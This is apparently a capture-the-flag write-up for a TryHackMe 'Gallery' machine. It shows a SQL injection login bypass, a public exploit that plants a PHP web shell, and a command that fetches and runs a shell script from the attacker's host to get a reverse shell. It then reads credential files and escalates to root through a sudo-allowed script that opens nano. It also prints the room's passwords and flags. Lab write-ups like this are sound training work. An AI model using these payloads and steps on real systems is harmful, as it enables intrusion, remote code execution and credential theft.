# IP
10.10.58.133

## Enumeration
### Nmap
Found two ports running on the system.
```console
❯ nmap -sC -sV 10.10.58.133 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-18 11:40 IST
Nmap scan report for 10.10.58.133
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Simple Image Gallery System
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.72 seconds
```
### http://10.10.58.133:8080
1. Found a login screen.
2. Just to test a payload user `admin' || ' 1==1` and password as `admin' || ' 1==1`.
3. Logged in as `Administrator`.
4. On searchsploit CMS `Simple Image Gallery`, so used exploit rather than uploading malicious file and getting a reverse shell.


## Exploit
### CMS
```console
❯ python3 50214.py
TARGET = http://10.10.58.133:8080
Login Bypass
shell name TagojeiavxeyjeimuxrLetta

protecting user

User ID : 1
Firsname : Adminstrator
Lasname : Admin
Username : admin

shell uploading
- OK -
Shell URL : http://10.10.58.133/gallery/uploads/1666074420_TagojeiavxeyjeimuxrLetta.php?cmd=whoami

```
On going to the shell URL, found that we can now use reverse shell. (Could also have uploaded a reverse shell inside code of exploit)
```console
❯ curl http://10.10.58.133/gallery/uploads/1666074420_TagojeiavxeyjeimuxrLetta.php\?cmd\=whoami
<pre>www-data
</pre>%
```
Uploaded a shell file from local machine.
```url
http://10.10.58.133/gallery/uploads/1666074420_TagojeiavxeyjeimuxrLetta.php?cmd=curl%20http://10.8.0.150/shell.sh%20%3E%3E%20/tmp/shell.sh
```
```console
❯ curl http://10.10.58.133/gallery/uploads/1666074420_TagojeiavxeyjeimuxrLetta.php\?cmd\=ls%20-l%20/tmp
<pre>total 4
-rw-r--r-- 1 www-data www-data 41 Oct 18 06:38 shell.sh
</pre>
```
Give execution permission to the file.<br />
(http://10.10.58.133/gallery/uploads/1666074420_TagojeiavxeyjeimuxrLetta.php?cmd=chmod%20+x%20/tmp/shell.sh)<br/>

Then executed file with <br/>
(http://10.10.58.133/gallery/uploads/1666074420_TagojeiavxeyjeimuxrLetta.php?cmd=bash%20/tmp/shell.sh)<br />

Got a reverse shell
```console
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.0.150] from (UNKNOWN) [10.10.58.133] 51058
bash: cannot set terminal process group (714): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gallery:/var/www/html/gallery/uploads$
```
On reading initialize.php in the remote machine found user and password for mysql
```console
www-data@gallery:/var/www/html/gallery$ cat initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");

```
Logged into mysql
```console
www-data@gallery:/var/www/html/gallery$ mysql -u gallery_user -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 191
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| gallery_db         |
| information_schema |
+--------------------+
2 rows in set (0.00 sec)

MariaDB [(none)]> use gallery_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [gallery_db]> show tables;
+----------------------+
| Tables_in_gallery_db |
+----------------------+
| album_list           |
| images               |
| system_info          |
| users                |
+----------------------+
4 rows in set (0.00 sec)

MariaDB [gallery_db]> select * from users;
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                                          | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1666074420_TagojeiavxeyjeimuxrLetta.php | NULL       |    1 | 2021-01-20 14:02:37 | 2022-10-18 06:27:37 |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
1 row in set (0.00 sec)

MariaDB [gallery_db]>
```
On loading linpeas.sh found that there is a backup folder for the user, with accounts.tx file
```console
www-data@gallery:/var/backups/mike_home_backup/documents$ cat accounts.txt
Spotify : mike@gmail.com:mycat666
Netflix : mike@gmail.com:123456789pass
TryHackme: mike:darkhacker123
```
All these creds are useless so looked at .bash_history in the backup folder and found password for the user mike `b3stpassw0rdbr0xx` .
```console
www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
```

Changed user to mike and got user flag
```console
www-data@gallery:/var/backups/mike_home_backup$ su mike
Password:
mike@gallery:/var/backups/mike_home_backup$ cd
mike@gallery:~$ cat user.txt
THM{af05cd30bfed67849befd546ef}
```
### Privilege escalation 
On sudo -l found that mike can run a script without password. 
```console
mike@gallery:~$ sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh

```
On reading file found that on giving option as read to the file while execution it opens a file with nano, which we can further exploit.<br />
```console
mike@gallery:~$ cat /opt/rootkit.sh
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac

mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh
Would you like to versioncheck, update, list or read the report ? read
```
Found the root flag
```console
# cat /root/root.txt
THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}

```


